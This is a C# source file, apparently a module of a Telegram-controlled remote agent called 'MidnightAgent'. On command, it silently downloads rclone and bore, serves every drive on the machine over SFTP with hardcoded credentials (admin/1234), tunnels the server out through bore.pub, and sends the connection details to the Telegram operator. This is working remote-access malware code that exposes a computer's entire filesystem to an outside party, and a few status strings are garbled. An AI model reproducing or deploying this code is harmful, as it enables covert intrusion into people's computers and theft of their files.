using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using MidnightAgent.Telegram;
using MidnightAgent.Utils;

namespace MidnightAgent.Features
{
    /// <summary>
    /// FTP/SFTP Feature - Expose Filesystem via SFTP used by Rclone
    /// Compatible with FileZilla, WinSCP
    /// </summary>
    public class FtpFeature : IFeature
    {
        public static TelegramService TelegramInstance { get; set; }

        public string Command => "ftp";
        public string Description => "Start SFTP Server (Best for FileZilla/WinSCP)";
        public string Usage => "/ftp start | stop";

        // Configuration
        // Rclone is robust and handles SFTP server perfectly over single port
        private const string RCLONE_URL = "https://downloads.rclone.org/v1.65.1/rclone-v1.65.1-windows-amd64.zip";
        private const string BORE_URL = "https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-pc-windows-msvc.zip";
        private const string BORE_SERVER = "bore.pub";

        private const string SFTP_USER = "admin";
        private const string SFTP_PASS = "1234";
        private const int INTERNAL_PORT = 10022;

        private static readonly SemaphoreSlim _lock = new SemaphoreSlim(1, 1);
        private readonly string WorkingDir = @"C:\Users\Public\MidnightFtp";
        
        private static Process _boreProcess;
        private static Process _rcloneProcess;

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length == 0) return FeatureResult.Fail(Usage);
            string action = args[0].ToLower();

            if (action == "stop")
            {
                // Force stop regardless of lock
                await Task.Run(() => StopSftp(false));
                
                // Force release lock if it was held (reset semaphore)
                if (_lock.CurrentCount == 0)
                {
                    try { _lock.Release(); } catch { }
                }
                
                return FeatureResult.Ok("SFTP forced stop.");
            }

            if (!_lock.Wait(0))
                return FeatureResult.Fail("⚠️ FTP Task is busy.");

            try
            {
                if (action == "start")
                {
                    if (TelegramInstance == null)
                    {
                        // Lock was never acquired here because we checked before lock.Wait(0)
                        // Wait... standard pattern is check, then wait.
                        // Wait, previous code:
                        // if (!_lock.Wait(0)) return ... 
                        // So we HAVE the lock here.
                        if (_lock.CurrentCount == 0)
                            try { _lock.Release(); } catch { }
                        return FeatureResult.Fail("⚠️ Agent needs restart.");
                    }

                    TelegramInstance?.SendMessage("🚀 <b>Starting SFTP Server...</b>");

                    _ = Task.Run(async () =>
                    {
                        try { await StartSftp(); }
                        catch (Exception ex)
                        {
                            TelegramInstance?.SendMessage($"❌ SFTP Error: {ex.Message}");
                            StopSftp(true);
                        }
                        finally 
                        { 
                            // Always release lock when async task finishes
                            try { _lock.Release(); } catch { }
                        }
                    });
                    
                    // Don't release lock here, the async task holds it!
                    return FeatureResult.Ok("SFTP deployment started.");
                }
            }
            catch (Exception ex)
            {
                // Only release if we haven't passed it to the background task
                if (action != "start")
                {
                   try { _lock.Release(); } catch { }
                }
                return FeatureResult.Fail($"Error: {ex.Message}");
            }
            
            // If we fall through (e.g. unknown command), release lock
             try { _lock.Release(); } catch { }
             return FeatureResult.Fail(Usage);
        }

        private async Task StartSftp()
        {
            // 1. Cleanup
            Directory.CreateDirectory(WorkingDir);
            StopSftp(true); // Ensure clean slate

            string rcloneExe = Path.Combine(WorkingDir, "rclone.exe");
            string boreExe = Path.Combine(WorkingDir, "bore.exe");

            // 2. Download Rclone
            if (!File.Exists(rcloneExe))
            {
                TelegramInstance?.SendMessage("⬇️ <b>(1/3) Downloading Rclone...</b>");
                string zipPath = Path.Combine(WorkingDir, "rclone.zip");
                
                using (var client = new WebClient())
                {
                    await client.DownloadFileTaskAsync(RCLONE_URL, zipPath);
                }

                TelegramInstance?.SendMessage("� <b>Extracting...</b>");
                ZipFile.ExtractToDirectory(zipPath, WorkingDir);
                
                // Rclone extracts to a subfolder, find and move it
                foreach (var file in Directory.GetFiles(WorkingDir, "rclone.exe", SearchOption.AllDirectories))
                {
                    if (file != rcloneExe)
                    {
                        File.Move(file, rcloneExe);
                        break;
                    }
                }
            }

            // 3. Download Bore (if needed, or reuse from VNC but safer to have own copy)
            if (!File.Exists(boreExe))
            {
                TelegramInstance?.SendMessage("⬇️ <b>(2/3) Downloading Tunnel...</b>");
                using (var client = new WebClient())
                {
                    await client.DownloadFileTaskAsync(BORE_URL, Path.Combine(WorkingDir, "bore.zip"));
                }
                ZipFile.ExtractToDirectory(Path.Combine(WorkingDir, "bore.zip"), WorkingDir);
            }

            // 3.5 Create Rclone Config for All Drives (Combine Backend)
            // This maps C:\ to /C/, D:\ to /D/, etc.
            string configPath = Path.Combine(WorkingDir, "rclone.conf");
            var sb = new StringBuilder();
            var upstreams = new List<string>();

            try
            {
                foreach (var drive in DriveInfo.GetDrives())
                {
                    if (drive.IsReady)
                    {
                        string letter = drive.Name.Substring(0, 1); // "C"
                        string path = drive.Name.Replace("\\", "/"); // "C:/"
                        
                        sb.AppendLine($"[{letter}]");
                        sb.AppendLine("type = local");
                        sb.AppendLine($"path = {path}");
                        sb.AppendLine();
                        
                        upstreams.Add($"{letter}={letter}:");
                    }
                }
            }
            catch {}

            // The 'combine' remote
            sb.AppendLine("[root]");
            sb.AppendLine("type = combine");
            sb.AppendLine($"upstreams = {string.Join(" ", upstreams)}");
            
            File.WriteAllText(configPath, sb.ToString());

            // 4. Start Rclone SFTP Server
            // Serves the 'root' combine remote
            TelegramInstance?.SendMessage("📂 <b>(3/3) Launching Server...</b>");
            
            string logPath = Path.Combine(WorkingDir, "sftp_debug.log");
            
            var rcloneStart = new ProcessStartInfo
            {
                FileName = rcloneExe,
                // Change localhost to 127.0.0.1 to avoid IPv6 issues
                // Add -v for logging
                // serve sftp root: (points to [root] combined remote)
                Arguments = $"serve sftp root: --config \"{configPath}\" --addr 127.0.0.1:{INTERNAL_PORT} --user {SFTP_USER} --pass {SFTP_PASS} --vfs-cache-mode full --no-auth=false",
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };
            
            _rcloneProcess = Process.Start(rcloneStart);
            
            // Capture Rclone output to log file
            Task.Run(() => 
            {
                try 
                {
                    while (_rcloneProcess != null && !_rcloneProcess.HasExited)
                    {
                        string line = _rcloneProcess.StandardError.ReadLine();
                        if (line != null) 
                        {
                            try { File.AppendAllText(logPath, $"[RCLONE] {line}\n"); } catch {}
                        }
                    }
                }
                catch {}
            });
            
            // Check if rclone started immediately
            if (_rcloneProcess.WaitForExit(2000))
            {
                string error = "Process exited early";
                try { error = File.ReadAllText(logPath); } catch {}
                throw new Exception($"Rclone exited early. Code: {_rcloneProcess.ExitCode}\nLog: {error}");
            }
            
            // 5. Start Bore Tunnel
            TelegramInstance?.SendMessage("🚇 <b>Creating Tunnel...</b>");
            string tunnelUrl = await StartBoreTunnel(boreExe);

            if (!string.IsNullOrEmpty(tunnelUrl))
            {
                // Parse Host/Port
                var match = Regex.Match(tunnelUrl, @"(.*?):(\d+)");
                string host = match.Groups[1].Value;
                string port = match.Groups[2].Value;

                TelegramInstance?.SendMessage(
                    $"✅ <b>SFTP ONLINE (All Drives)</b>\n" +
                    $"✨ <i>Optimized for stability</i>\n\n" +
                    $"🌐 <b>Host:</b> <code>{host}</code>\n" +
                    $"🔌 <b>Port:</b> <code>{port}</code>\n" +
                    $"👤 <b>User:</b> <code>{SFTP_USER}</code>\n" +
                    $"🔑 <b>Pass:</b> <code>{SFTP_PASS}</code>\n\n" +
                    $"⚠️ <b>IMPORTANT:</b>\n" +
                    $"In FileZilla/WinSCP, set Protocol to <b>SFTP</b>"
                );
            }
            else
            {
                throw new Exception("Tunnel failed to connect.");
            }
        }

        private async Task<string> StartBoreTunnel(string boreExe)
        {
            string url = null;
            
            _boreProcess = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = boreExe,
                    // Added --keep-alive to prevent timeouts
                    Arguments = $"local {INTERNAL_PORT} --to {BORE_SERVER}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            _boreProcess.OutputDataReceived += (s, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    // Check for URL in stdout
                    var match = Regex.Match(e.Data, @"(bore\.pub:\d+)");
                    if (match.Success) url = match.Groups[1].Value;
                }
            };

            _boreProcess.ErrorDataReceived += (s, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    // Check for URL in stderr
                    var match = Regex.Match(e.Data, @"(bore\.pub:\d+)");
                    if (match.Success) url = match.Groups[1].Value;
                }
            };
            
            _boreProcess.Start();
            _boreProcess.BeginOutputReadLine();
            _boreProcess.BeginErrorReadLine();
            
            // Wait for URL
            for (int i = 0; i < 30 && url == null; i++)
            {
                await Task.Delay(500);
                if (_boreProcess.HasExited) return null;
            }
            
            return url;
        }

        private void StopSftp(bool silent)
        {
            try
            {
                if (_boreProcess != null && !_boreProcess.HasExited)
                {
                    _boreProcess.Kill();
                    _boreProcess = null;
                }

                if (_rcloneProcess != null && !_rcloneProcess.HasExited)
                {
                    _rcloneProcess.Kill();
                    _rcloneProcess = null;
                }
                
                // Cleanup orphans
                foreach (var p in Process.GetProcessesByName("rclone"))
                    try { p.Kill(); } catch { }
                    
                foreach (var p in Process.GetProcessesByName("bore"))
                    try { if (p.MainModule.FileName.Contains("MidnightFtp")) p.Kill(); } catch { }
            }
            catch { }

            if (!silent)
                TelegramInstance?.SendMessage("� <b>SFTP Stopped</b>");
        }
    }
}
